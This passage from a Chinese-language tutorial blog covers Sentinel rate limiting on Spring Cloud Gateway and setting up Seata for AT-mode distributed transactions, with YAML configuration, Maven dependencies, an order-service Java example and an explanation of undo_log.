class="comment">     */</span></span><br><span class="line">    <span class="meta">@PostConstruct</span> <span class="comment">// javax.annotation.PostConstruct</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">doInit</span><span class="params">()</span> &#123;</span><br><span class="line">        initBlockHandler();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 初始化流量限制规则和处理程序。</span></span><br><span class="line"><span class="comment">     * &lt;p&gt;</span></span><br><span class="line"><span class="comment">     * 设置限流规则，并定义自定义的异常处理器来返回特定的错误信息给客户端。</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="comment">// 处理/自定义返回的例外信息</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">initBlockHandler</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="comment">// 创建并设置限流规则集合</span></span><br><span class="line">        Set&lt;GatewayFlowRule&gt; rules = <span class="keyword">new</span> <span class="title class_">HashSet</span>&lt;&gt;();</span><br><span class="line">        <span class="comment">// 添加限流规则：每秒最多允许2个请求到&quot;pay_routh1&quot;</span></span><br><span class="line">        rules.add(<span class="keyword">new</span> <span class="title class_">GatewayFlowRule</span>(<span class="string">&quot;pay_routh1&quot;</span>).setCount(<span class="number">2</span>).setIntervalSec(<span class="number">1</span>));</span><br><span class="line">        <span class="comment">// 加载限流规则</span></span><br><span class="line">        GatewayRuleManager.loadRules(rules);</span><br><span class="line">        <span class="comment">// 定义自定义的限流处理器</span></span><br><span class="line">        <span class="type">BlockRequestHandler</span> <span class="variable">handler</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BlockRequestHandler</span>() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> Mono&lt;ServerResponse&gt; <span class="title function_">handleRequest</span><span class="params">(ServerWebExchange exchange, Throwable t)</span> &#123;</span><br><span class="line">                <span class="comment">// 创建响应数据</span></span><br><span class="line">                Map&lt;String, String&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">                <span class="comment">// 设置错误码和消息</span></span><br><span class="line">                map.put(<span class="string">&quot;errorCode&quot;</span>, HttpStatus.TOO_MANY_REQUESTS.getReasonPhrase());</span><br><span class="line">                map.put(<span class="string">&quot;errorMessage&quot;</span>, <span class="string">&quot;请求太过频繁，系统忙不过来，触发限流(sentinel+gataway整合Case)&quot;</span>);</span><br><span class="line"></span><br><span class="line">                <span class="comment">// 返回带有状态码和JSON内容类型的响应</span></span><br><span class="line">                <span class="keyword">return</span> ServerResponse.status(HttpStatus.TOO_MANY_REQUESTS)</span><br><span class="line">                        .contentType(MediaType.APPLICATION_JSON)</span><br><span class="line">                        .body(BodyInserters.fromValue(map));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 设置全局的限流处理器</span></span><br><span class="line">        GatewayCallbackManager.setBlockHandler(handler);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>这段代码的主要功能是：</p>
<ul>
<li>在Spring应用启动时，通过<code>@PostConstruct</code>注解的方法<code>doInit()</code>进行初始化操作。</li>
<li><code>initBlockHandler()</code>方法用于配置流量控制规则，并定义一个自定义的限流处理器。这个处理器会在请求超过设定的速率限制时被调用，向客户端返回适当的错误信息（如HTTP 429 Too Many Requests）。</li>
</ul>
<h2 id="Seata处理分布式事务"><a href="#Seata处理分布式事务" class="headerlink" title="Seata处理分布式事务"></a>Seata处理分布式事务</h2><h3 id="简介-1"><a href="#简介-1" class="headerlink" title="简介"></a>简介</h3><p><a href="https://seata.apache.org/zh-cn/">官网</a>		<a href="https://github.com/apache/incubator-seata">源码</a>		<a href="https://seata.apache.org/zh-cn/docs/ops/deploy-guide-beginner/">文档</a></p>
<p><strong>Seata</strong> (<code>simple extensiable autonomous transaction architecture</code>) 是一个开源的分布式事务解决方案，旨在解决微服务架构中的分布式事务问题。Seata 支持多种分布式事务模式，能够确保在跨多个服务或数据库的操作中保持数据的一致性和完整性。（在微服务项目中，不同的微服务可能对应不同的数据库（指的是存数据的库，即database，不是数据库的版本），而一个操作可能涉及到多个数据库，seata就是为了应对在微服务架构中跨多个数据库进行事务操作的需求而设计的。）</p>
<p>情景引入：</p>
<blockquote>
<p>一次业务操作需要跨多个数据源或需要跨多个系统进行远程调用，就会产生分布式事务问题。但是，关系型数据库提供的能力是基于单机事务的，只能在本数据库（指的是存数据的库）内的操作事务，一旦遇到分布式事务场景，就需要通过更多其他技术手段来解决问题。</p>
<p>单体应用被拆分成微服务应用，原来的三个模块被拆分成三个独立的应用，分别使用三个独立的数据源，业务操作需要调用三个服务来完成。此时每个服务自己内部的数据一致性由本地事务来保证，但是全局的数据一致性问题没法保证。</p>
</blockquote>
<h4 id="下载安装"><a href="#下载安装" class="headerlink" title="下载安装"></a>下载安装</h4><p><a href="https://seata.apache.org/zh-cn/download/seata-server">下载地址</a> 本笔记使用V2.0.0，下载解压即可。</p>
<h4 id="启动Seata服务（DB模式）"><a href="#启动Seata服务（DB模式）" class="headerlink" title="启动Seata服务（DB模式）"></a>启动Seata服务（DB模式）</h4><p>db模式为高可用模式，全局事务会话信息通过db共享，相应性能差些;</p>
<h5 id="步骤1：MySQL新建seata库，在其中建表global-table、branch-table、lock-table"><a href="#步骤1：MySQL新建seata库，在其中建表global-table、branch-table、lock-table" class="headerlink" title="步骤1：MySQL新建seata库，在其中建表global_table、branch_table、lock_table"></a><strong>步骤1：MySQL新建seata库，在其中建表global_table、branch_table、lock_table</strong></h5><p>请严格参照<a href="https://github.com/apache/incubator-seata/blob/develop/script/server/db/mysql.sql">网址</a>的建表语法创建，建议直接复制。</p>
<h5 id="步骤2：修改配置文件"><a href="#步骤2：修改配置文件" class="headerlink" title="步骤2：修改配置文件"></a>步骤2：修改配置文件</h5><p>在安装目录-conf目录下修改<code>application.yaml</code>（建议先备份）需要修改：</p>
<ul>
<li><code>seata-config-type</code>：根据实际服务配置中心设置，本文修改为nacos。并在其下添加同级nacos说明</li>
<li><code>seata-registry-type</code>：根据实际服务注册中心设置，本文修改为nacos。并在其下添加同级nacos说明</li>
<li><code>seata-store-mode</code>：修改为db。并在其下添加同级db说明，根据实际情况编写</li>
</ul>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">seata:</span></span><br><span class="line">  <span class="attr">config:</span></span><br><span class="line">    <span class="comment"># support: nacos, consul, apollo, zk, etcd3</span></span><br><span class="line">    <span class="comment"># type: file</span></span><br><span class="line">    <span class="attr">type:</span> <span class="string">nacos</span></span><br><span class="line">    <span class="attr">nacos:</span></span><br><span class="line">      <span class="attr">server-addr:</span> <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span><span class="string">:8848</span></span><br><span class="line">      <span class="attr">namespace:</span></span><br><span class="line">      <span class="attr">group:</span> <span class="string">SEATA_GROUP</span> <span class="comment">#后续自己在nacos里面新建,不想新建SEATA_GROUP，就写DEFAULT_GROUP</span></span><br><span class="line">      <span class="attr">username:</span> <span class="string">nacos</span></span><br><span class="line">      <span class="attr">password:</span> <span class="string">nacos</span></span><br><span class="line">  <span class="attr">registry:</span></span><br><span class="line">    <span class="comment"># support: nacos, eureka, redis, zk, consul, etcd3, sofa</span></span><br><span class="line">    <span class="comment"># type: file</span></span><br><span class="line">    <span class="attr">type:</span> <span class="string">nacos</span></span><br><span class="line">    <span class="attr">nacos:</span></span><br><span class="line">      <span class="attr">application:</span> <span class="string">seata-server</span></span><br><span class="line">      <span class="attr">server-addr:</span> <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span><span class="string">:8848</span></span><br><span class="line">      <span class="attr">group:</span> <span class="string">SEATA_GROUP</span> <span class="comment">#后续自己在nacos里面新建,不想新建SEATA_GROUP，就写DEFAULT_GROUP</span></span><br><span class="line">      <span class="attr">namespace:</span></span><br><span class="line">      <span class="attr">cluster:</span> <span class="string">default</span></span><br><span class="line">      <span class="attr">username:</span> <span class="string">nacos</span></span><br><span class="line">      <span class="attr">password:</span> <span class="string">nacos</span>    </span><br><span class="line">  <span class="attr">store:</span></span><br><span class="line">    <span class="comment"># support: file 、 db 、 redis 、 raft</span></span><br><span class="line">    <span class="comment"># mode: file</span></span><br><span class="line">    <span class="attr">mode:</span> <span class="string">db</span></span><br><span class="line">    <span class="attr">db:</span></span><br><span class="line">      <span class="attr">datasource:</span> <span class="string">druid</span></span><br><span class="line">      <span class="attr">db-type:</span> <span class="string">mysql</span></span><br><span class="line">      <span class="attr">driver-class-name:</span> <span class="string">com.mysql.cj.jdbc.Driver</span></span><br><span class="line">      <span class="attr">url:</span> <span class="string">jdbc:mysql://localhost:3306/seata?characterEncoding=utf8&amp;useSSL=false&amp;serverTimezone=GMT%2B8&amp;rewriteBatchedStatements=true&amp;allowPublicKeyRetrieval=true</span></span><br><span class="line">      <span class="attr">user:</span> <span class="string">root</span></span><br><span class="line">      <span class="attr">password:</span> <span class="number">123456</span></span><br><span class="line">      <span class="attr">min-conn:</span> <span class="number">10</span></span><br><span class="line">      <span class="attr">max-conn:</span> <span class="number">100</span></span><br><span class="line">      <span class="attr">global-table:</span> <span class="string">global_table</span></span><br><span class="line">      <span class="attr">branch-table:</span> <span class="string">branch_table</span></span><br><span class="line">      <span class="attr">lock-table:</span> <span class="string">lock_table</span></span><br><span class="line">      <span class="attr">distributed-lock-table:</span> <span class="string">distributed_lock</span></span><br><span class="line">      <span class="attr">query-limit:</span> <span class="number">100</span></span><br><span class="line">      <span class="attr">max-wait:</span> <span class="number">5000</span></span><br></pre></td></tr></table></figure>



<p>其他模式请参考<code>application.example.yml</code></p>
<h5 id="启动运行并验证"><a href="#启动运行并验证" class="headerlink" title="启动运行并验证"></a>启动运行并验证</h5><p>在安装目录-bin下运行<code>seata-server.bat</code>。</p>
<p>验证：</p>
<ul>
<li>nacos管理页面可见服务。</li>
<li>seata运行管理页面<code>http://localhost:7091/</code>，账号密码均在前文yml中配置，默认均为seata</li>
</ul>
<h3 id="工作流程"><a href="#工作流程" class="headerlink" title="工作流程"></a>工作流程</h3><p><strong>三个组件：</strong></p>
<ul>
<li><code>TC (Transaction Coordinator) </code>：事务协调者（<code>seata</code>)，维护全局和分支事务的状态，驱动全局事务提交或回滚。</li>
<li><code>TM (Transaction Manager) </code>：事务管理器（标注了<code>@GlobalTransactional</code>的微服务模块，是事务的发起者），定义全局事务的范围，并根据TC维护的全局事务和分支事务状态，开始全局事务、提交或回滚全局事务。</li>
<li><code>RM (Resource Manager)</code> ：资源管理器（微服务中管理本地事务，即对数据库进行操作的组件），管理分支事务处理的资源，与TC交谈以注册分支事务和报告分支事务的状态，并驱动分支事务提交或回滚。</li>
</ul>
<p>三个组件相互协作，TC以Seata 服务器(Server)形式独立部署，TM和RM则是以Seata Client的形式集成在微服务中运行，相当于项目组长TC-小组长TM-程序员RM</p>
<ol>
<li>TM 向 TC 申请开启一个全局事务，全局事务创建成功并生成一个全局唯一的 XID；</li>
<li>XID 在微服务调用链路的上下文中传播；</li>
<li>RM 向 TC 注册分支事务，将其纳入 XID 对应全局事务的管辖；</li>
<li>TM 向 TC 发起针对 XID 的全局提交或回滚决议；</li>
<li>TC 调度 XID 下管辖的全部分支事务完成提交或回滚请求。</li>
</ol>
<p><img src="https://raw.githubusercontent.com/Fushiye/BlogPicture/main/img_blog/20250306160752.png"></p>
<table>
<thead>
<tr>
<th>角色</th>
<th>核心职责</th>
</tr>
</thead>
<tbody><tr>
<td><strong>TM</strong></td>
<td>定义全局事务边界，发起全局提交&#x2F;回滚，管理事务生命周期。</td>
</tr>
<tr>
<td><strong>TC</strong></td>
<td>协调全局事务状态，驱动分支事务的提交或回滚（决策者）。</td>
</tr>
<tr>
<td><strong>RM</strong></td>
<td>管理本地事务，生成&#x2F;删除 undo_log，执行 TC 的提交或回滚指令（执行者）。</td>
</tr>
</tbody></table>
<h4 id="AT模式工作流程示例"><a href="#AT模式工作流程示例" class="headerlink" title="AT模式工作流程示例"></a>AT模式工作流程示例</h4><p>以用户下单扣库存的分布式事务为例：</p>
<h5 id="1-全局事务开启（TM-发起）"><a href="#1-全局事务开启（TM-发起）" class="headerlink" title="1. 全局事务开启（TM 发起）"></a><strong>1. 全局事务开启（TM 发起）</strong></h5><ul>
<li><strong>场景</strong>：用户下单时，订单服务需要调用库存服务扣减库存，两者属于不同微服务（不同数据库）。</li>
<li><strong>TM（订单服务）</strong>：<ul>
<li>在业务方法上标注 <code>@GlobalTransactional</code>，<strong>开启全局事务</strong>。</li>
<li>向 <strong>TC（Seata Server）</strong> 发起请求，申请一个 <strong>全局事务ID（XID）</strong>。</li>
<li>将 XID 通过请求头（如 HTTP Header）传递给其他微服务（如库存服务）。</li>
</ul>
</li>
</ul>
<h5 id="2-分支事务注册与执行（RM-参与）"><a href="#2-分支事务注册与执行（RM-参与）" class="headerlink" title="2. 分支事务注册与执行（RM 参与）"></a><strong>2. 分支事务注册与执行（RM 参与）</strong></h5><ul>
<li><p><strong>订单服务（RM1）</strong>：</p>
<ul>
<li>执行本地 SQL（如插入订单表）。</li>
<li>在本地事务提交前，<strong>RM1 会拦截 SQL，生成 undo_log（回滚日志）</strong>，记录数据修改前的快照。</li>
<li><strong>向 TC 注册分支事务</strong>，关联全局 XID，告知 TC 自己属于该全局事务的一部分。</li>
<li><strong>提交本地事务</strong>（实际会先 hold 住，等待 TC 通知）。</li>
</ul>
</li>
<li><p><strong>库存服务（RM2）</strong>：</p>
<ul>
<li>收到订单服务的调用（携带 XID）。</li>
<li>执行本地 SQL（如扣减库存）。</li>
<li>同样生成 undo_log，<strong>向 TC 注册分支事务</strong>，关联同一个 XID。</li>
<li><strong>提交本地事务</strong>（同样先 hold 住）。</li>
</ul>
</li>
</ul>
<h5 id="3-全局事务提交-回滚（TC-协调）"><a href="#3-全局事务提交-回滚（TC-协调）" class="headerlink" title="3. 全局事务提交&#x2F;回滚（TC 协调）"></a><strong>3. 全局事务提交&#x2F;回滚（TC 协调）</strong></h5><ul>
<li><p><strong>TM（订单服务）</strong>：</p>
<ul>
<li>所有分支事务执行完毕后，TM 向 TC 发起 <strong>全局提交</strong> 或 <strong>全局回滚</strong> 请求。</li>
</ul>
</li>
<li><p><strong>TC（Seata Server）</strong>：</p>
<ul>
<li><strong>Phase 1（一阶段提交）</strong>：<ul>
<li>检查所有分支事务的本地事务是否已提交（通过分支事务状态）。</li>
<li>若所有分支事务成功，TC <strong>异步删除各 RM 的 undo_log</strong>，完成最终提交。</li>
</ul>
</li>
<li><strong>Phase 2（二阶段提交&#x2F;回滚）</strong>：<ul>
<li><strong>提交</strong>：TC 通知所有 RM 提交本地事务（实际是释放 hold 住的提交）。</li>
<li><strong>回滚</strong>：如果有分支事务失败，TC 通知所有 RM 根据 undo_log 回滚数据。</li>
</ul>
</li>
</ul>
</li>
</ul>
<h5 id="异常场景处理"><a href="#异常场景处理" class="headerlink" title="异常场景处理"></a><strong>异常场景处理</strong></h5><ol>
<li><strong>某个分支事务失败</strong>：<ul>
<li>TC 收到失败状态后，通过 undo_log 回滚所有已提交的分支事务。</li>
</ul>
</li>
<li><strong>TC 宕机</strong>：<ul>
<li>Seata Server 高可用部署，通过集群保证 TC 的可用性。</li>
</ul>
</li>
<li><strong>网络中断</strong>：<ul>
<li>RM 会重试与 TC 的通信，直到事务状态最终一致。</li>
</ul>
</li>
</ol>
<h3 id="项目实战"><a href="#项目实战" class="headerlink" title="项目实战"></a>项目实战</h3><h4 id="必要步骤"><a href="#必要步骤" class="headerlink" title="必要步骤"></a>必要步骤</h4><p>【1】DB模式下，每个微服务对应的数据库都必须参照<a href="https://github.com/apache/incubator-seata/blob/2.x/script/client/at/db/mysql.sql">网址</a>建表<code>undo_log</code></p>
<h4 id="微服务创建"><a href="#微服务创建" class="headerlink" title="微服务创建"></a>微服务创建</h4><p>仅说明与seata有关的操作</p>
<p>注意：为版本兼容，需要：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!--仅为了整合openfeign + alibaba seata的案例，降低版本处理下--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">spring.boot.version</span>&gt;</span>3.1.7<span class="tag">&lt;/<span class="name">spring.boot.version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">spring.cloud.version</span>&gt;</span>2022.0.4<span class="tag">&lt;/<span class="name">spring.cloud.version</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>否则报错：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">java.lang.IllegalArgumentException: Name for argument of type [java.lang.Long] not specified, and parameter name information not found in class file either.</span><br></pre></td></tr></table></figure>



<h5 id="引入依赖"><a href="#引入依赖" class="headerlink" title="引入依赖"></a>引入依赖</h5><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.alibaba.cloud<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-cloud-starter-alibaba-seata<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h5 id="编写配置"><a href="#编写配置" class="headerlink" title="编写配置"></a>编写配置</h5><p><a href="https://seata.apache.org/zh-cn/docs/user/configurations">参见</a></p>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">seata:</span></span><br><span class="line">  <span class="attr">registry:</span></span><br><span class="line">    <span class="attr">type:</span> <span class="string">nacos</span></span><br><span class="line">    <span class="attr">nacos:</span></span><br><span class="line">      <span class="attr">server-addr:</span> <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span><span class="string">:8848</span></span><br><span class="line">      <span class="attr">namespace:</span> <span class="string">&quot;&quot;</span></span><br><span class="line">      <span class="attr">group:</span> <span class="string">SEATA_GROUP</span></span><br><span class="line">      <span class="attr">application:</span> <span class="string">seata-server</span></span><br><span class="line">  <span class="attr">tx-service-group:</span> <span class="string">default_tx_group</span> <span class="comment"># 事务组，由它获得TC服务的集群名称</span></span><br><span class="line">  <span class="attr">service:</span></span><br><span class="line">    <span class="attr">vgroup-mapping:</span></span><br><span class="line">      <span class="attr">default_tx_group:</span> <span class="string">default</span> <span class="comment"># 事务组与TC服务集群的映射关系</span></span><br><span class="line">  <span class="attr">data-source-proxy-mode:</span> <span class="string">AT</span></span><br></pre></td></tr></table></figure>

<h5 id="数据库操作前使用GlobalTransactional注解"><a href="#数据库操作前使用GlobalTransactional注解" class="headerlink" title="数据库操作前使用GlobalTransactional注解"></a>数据库操作前使用<code>GlobalTransactional</code>注解</h5><p>Order微服务的service层方法，新增订单时需要扣减账户金额和库存，涉及到跨微服务跨数据库的事务操作（分布式事务）在操作的方法前添加<code>GlobalTransactional</code>注解。同时由于在一个微服务中可能有多个分布式事务，所以建议以<code>name</code>属性区分，并要求在出现异常时回滚<code>rollbackFor = Exception.class</code>(同<code>@Transactional</code>注解：</p>
<p><strong>建议一个分布式事务只操作3个以内的数据库，如果超过建议分成多个事务并用一个事务包裹</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Slf4j</span></span><br><span class="line"><span class="meta">@Service</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">OrderServiceImpl</span> <span class="keyword">implements</span> <span class="title class_">OrderService</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="meta">@Resource</span></span><br><span class="line">    <span class="keyword">private</span> OrderMapper orderMapper;</span><br><span class="line">    <span class="meta">@Resource</span><span class="comment">//订单微服务通过OpenFeign去调用库存微服务</span></span><br><span class="line">    <span class="keyword">private</span> StorageFeignApi storageFeignApi;</span><br><span class="line">    <span class="meta">@Resource</span><span class="comment">//订单微服务通过OpenFeign去调用账户微服务</span></span><br><span class="line">    <span class="keyword">private</span> AccountFeignApi accountFeignApi;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="meta">@GlobalTransactional(name = &quot;zzyy-create-order&quot;,rollbackFor = Exception.class)</span> <span class="comment">//AT</span></span><br><span class="line">    <span class="comment">//@GlobalTransactional @Transactional(rollbackFor = Exception.class) //XA</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">create</span><span class="params">(Order order)</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//xid检查</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">xid</span> <span class="operator">=</span> RootContext.getXID();</span><br><span class="line"></span><br><span class="line">        <span class="comment">//1. 新建订单</span></span><br><span class="line">        log.info(<span class="string">&quot;==================&gt;开始新建订单&quot;</span>+<span class="string">&quot;\t&quot;</span>+<span class="string">&quot;xid_order:&quot;</span> +xid);</span><br><span class="line">        <span class="comment">//订单状态status：0：创建中；1：已完结</span></span><br><span class="line">        order.setStatus(<span class="number">0</span>);</span><br><span class="line">        <span class="type">int</span> <span class="variable">result</span> <span class="operator">=</span> orderMapper.insertSelective(order);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//插入订单成功后获得插入mysql的实体对象</span></span><br><span class="line">        <span class="type">Order</span> <span class="variable">orderFromDB</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">if</span>(result &gt; <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            orderFromDB = orderMapper.selectOne(order);</span><br><span class="line">            <span class="comment">//orderFromDB = orderMapper.selectByPrimaryKey(order.getId());</span></span><br><span class="line">            log.info(<span class="string">&quot;-------&gt; 新建订单成功，orderFromDB info: &quot;</span>+orderFromDB);</span><br><span class="line">            System.out.println();</span><br><span class="line">            <span class="comment">//2. 扣减库存</span></span><br><span class="line">            log.info(<span class="string">&quot;-------&gt; 订单微服务开始调用Storage库存，做扣减count&quot;</span>);</span><br><span class="line">            storageFeignApi.decrease(orderFromDB.getProductId(), orderFromDB.getCount());</span><br><span class="line">            log.info(<span class="string">&quot;-------&gt; 订单微服务结束调用Storage库存，做扣减完成&quot;</span>);</span><br><span class="line">            System.out.println();</span><br><span class="line">            <span class="comment">//3. 扣减账号余额</span></span><br><span class="line">            log.info(<span class="string">&quot;-------&gt; 订单微服务开始调用Account账号，做扣减money&quot;</span>);</span><br><span class="line">            accountFeignApi.decrease(orderFromDB.getUserId(), orderFromDB.getMoney());</span><br><span class="line">            log.info(<span class="string">&quot;-------&gt; 订单微服务结束调用Account账号，做扣减完成&quot;</span>);</span><br><span class="line">            System.out.println();</span><br><span class="line">            <span class="comment">//4. 修改订单状态</span></span><br><span class="line">            <span class="comment">//订单状态status：0：创建中；1：已完结</span></span><br><span class="line">            log.info(<span class="string">&quot;-------&gt; 修改订单状态&quot;</span>);</span><br><span class="line">            orderFromDB.setStatus(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">            Example whereCondition=<span class="keyword">new</span> <span class="title class_">Example</span>(Order.class);</span><br><span class="line">            Example.Criteria criteria=whereCondition.createCriteria();</span><br><span class="line">            criteria.andEqualTo(<span class="string">&quot;userId&quot;</span>,orderFromDB.getUserId());</span><br><span class="line">            criteria.andEqualTo(<span class="string">&quot;status&quot;</span>,<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">            <span class="type">int</span> <span class="variable">updateResult</span> <span class="operator">=</span> orderMapper.updateByExampleSelective(orderFromDB, whereCondition);</span><br><span class="line"></span><br><span class="line">            log.info(<span class="string">&quot;-------&gt; 修改订单状态完成&quot;</span>+<span class="string">&quot;\t&quot;</span>+updateResult);</span><br><span class="line">            log.info(<span class="string">&quot;-------&gt; orderFromDB info: &quot;</span>+orderFromDB);</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println();</span><br><span class="line">        log.info(<span class="string">&quot;==================&gt;结束新建订单&quot;</span>+<span class="string">&quot;\t&quot;</span>+<span class="string">&quot;xid_order:&quot;</span> +xid);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p><strong>AT 模式的核心思想</strong></p>
<p>AT（Auto Transaction）模式是 Seata 的默认模式，<strong>基于两阶段提交（2PC）优化</strong>，通过 <strong>自动生成反向 SQL（undo_log）</strong> 实现事务回滚，<strong>对业务代码几乎零侵入</strong>。<br>适用于大多数基于关系型数据库的分布式事务场景（如订单、库存、账户服务等）。</p>
<h4 id="AT-模式的工作流程（两阶段）"><a href="#AT-模式的工作流程（两阶段）" class="headerlink" title="AT 模式的工作流程（两阶段）"></a><strong>AT 模式的工作流程（两阶段）</strong></h4><h5 id="1-第一阶段（Phase-1）：执行本地事务并生成-undo-log"><a href="#1-第一阶段（Phase-1）：执行本地事务并生成-undo-log" class="headerlink" title="1. 第一阶段（Phase 1）：执行本地事务并生成 undo_log"></a><strong>1. 第一阶段（Phase 1）：执行本地事务并生成 undo_log</strong></h5><ul>
<li><strong>核心目标</strong>：每个分支事务执行本地操作，并记录数据快照（undo_log），<strong>提前提交本地事务</strong>（与传统 2PC 的“Prepare”阶段不同）。  </li>
<li><strong>具体步骤</strong>：  <ol>
<li><strong>SQL 解析与拦截</strong>：  <ul>
<li>RM 通过 Seata 的 <code>DataSourceProxy</code> 代理数据源，拦截业务 SQL（如 <code>INSERT/UPDATE/DELETE</code>）。</li>
</ul>
</li>
<li><strong>生成 undo_log</strong>：  <ul>
<li>解析 SQL 并生成 <strong>前置镜像（before image）</strong> 和 <strong>后置镜像（after image）</strong>，保存到 <code>undo_log</code> 表中。  </li>
<li>示例：  <figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- 前置镜像（修改前的数据）</span></span><br><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> product <span class="keyword">WHERE</span> id <span class="operator">=</span> <span class="number">1</span>;</span><br><span class="line"><span class="comment">-- 后置镜像（修改后的数据）</span></span><br><span class="line"><span class="keyword">UPDATE</span> product <span class="keyword">SET</span> stock <span class="operator">=</span> stock <span class="operator">-</span> <span class="number">1</span> <span class="keyword">WHERE</span> id <span class="operator">=</span> <span class="number">1</span>;</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><strong>注册分支事务</strong>：  <ul>
<li>RM 向 TC（Seata Server）注册分支事务，绑定全局事务 ID（XID）。</li>
</ul>
</li>
<li><strong>提交本地事务</strong>：  <ul>
<li><strong>直接提交本地事务</strong>（将业务数据修改和 <code>undo_log</code> 写入数据库，保证原子性）。</li>
</ul>
</li>
<li><strong>释放本地锁，获取全局锁</strong>：  <ul>
<li>提交后释放本地数据库锁，但会通过 TC 获取 <strong>全局锁</strong>，防止其他事务脏写。</li>
</ul>
</li>
</ol>
</li>
</ul>
<h5 id="2-第二阶段（Phase-2）：全局提交或回滚"><a href="#2-第二阶段（Phase-2）：全局提交或回滚" class="headerlink" title="2. 第二阶段（Phase 2）：全局提交或回滚"></a><strong>2. 第二阶段（Phase 2）：全局提交或回滚</strong></h5><ul>
<li><p><strong>全局提交</strong>：  </p>
<ul>
<li>若所有分支事务成功，TC 通知各 RM <strong>异步删除 undo_log</strong>，释放全局锁。  </li>
<li>由于本地事务已提交，此阶段仅清理日志，效率极高。</li>
</ul>
</li>
<li><p><strong>全局回滚</strong>：  </p>
<ul>
<li>若任一分支事务失败，TC 通知各 RM <strong>根据 undo_log 回滚数据</strong>：  <ol>
<li>检查当前数据是否与 <strong>后置镜像</strong> 一致（确保未被其他事务修改）。  </li>
<li>若一致，执行反向 SQL（用前置镜像恢复数据）。  </li>
<li>删除 undo_log，释放全局锁。</li>
</ol>
</li>
<li><strong>回滚失败处理</strong>：若数据被其他事务修改（全局锁失效），需人工介入。</li>
</ul>
</li>
</ul>
<p><img src="https://raw.githubusercontent.com/Fushiye/BlogPicture/main/img_blog/20250306215146.png"></p>
<h4 id="AT-模式的核心机制"><a href="#AT-模式的核心机制" class="headerlink" title="AT 模式的核心机制"></a><strong>AT 模式的核心机制</strong></h4><h5 id="1-undo-log-机制"><a href="#1-undo-log-机制" class="headerlink" title="1. undo_log 机制"></a><strong>1. undo_log 机制</strong></h5><ul>
<li><strong>作用</strong>：记录数据修改前后的快照，用于回滚。  </li>
<li><strong>存储</strong>：每个参与事务的数据库中都有一个 <code>undo_log</code> 表，结构如下：  <figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> undo_log (</span><br><span class="line">  id <span class="type">BIGINT</span> AUTO_INCREMENT <span class="keyword">PRIMARY</span> KEY,</span><br><span class="line">  branch_id <span class="type">BIGINT</span> <span class="keyword">NOT</span> <span class="keyword">NULL</span>,  <span class="comment">-- 分支事务ID</span></span><br><span class="line">  xid <span class="type">VARCHAR</span>(<span class="number">100</span>) <span class="keyword">NOT</span> <span class="keyword">NULL</span>,   <span class="comment">-- 全局事务ID</span></span><br><span class="line">  context <span class="type">VARCHAR</span>(<span class="number">128</span>) <span class="keyword">NOT</span> <span class="keyword">NULL</span>,</span><br><span class="line">  rollback_info LONGBLOB <span class="keyword">NOT</span> <span class="keyword">NULL</span>,  <span class="comment">-- 回滚信息（前后镜像）</span></span><br><span class="line">  log_status <span class="type">INT</span> <span class="keyword">NOT</span> <span class="keyword">NULL</span>,          <span class="comment">-- 状态（0-正常，1-已删除）</span></span><br><span class="line">  log_created <span 